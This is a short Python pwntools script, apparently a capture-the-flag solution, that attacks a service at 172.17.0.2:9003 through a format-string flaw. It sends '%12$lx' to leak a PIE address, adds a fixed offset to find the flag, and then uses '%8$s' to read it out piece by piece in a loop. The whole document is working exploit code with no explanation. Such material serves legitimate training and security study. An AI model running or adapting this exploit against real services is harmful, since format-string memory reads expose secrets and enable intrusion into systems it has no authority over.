#!/usr/bin/env python3

from pwn import *

context.log_level = "error"

OFFSET = 0x2df0
step = 0
flag = b""

while True:
   try:
      io = remote("172.17.0.2", 9003)
      io.recvuntil(b"?")
      io.sendline(b"%12$lx")

      res = io.recvuntil(b"here :")
      leak_pie = int("0x" + res.split(b"\r\n")[3].decode(), 16)
      flag_loc = leak_pie + OFFSET + step

      payload = p64(flag_loc)
      io.sendline(payload)

      io.recvuntil(b"here :")
      io.sendline(b"%8$s")

      res = io.recvuntil(b"Bye").split(b"\r\n")[6]

      step += 2
      io.close()

      flag += res
      print(res)

      if b"}" in res:
         break

   except:
       print("[ERROR] Broken I/O -> Looping again")

print("\n [FLAG] : " + flag.decode())
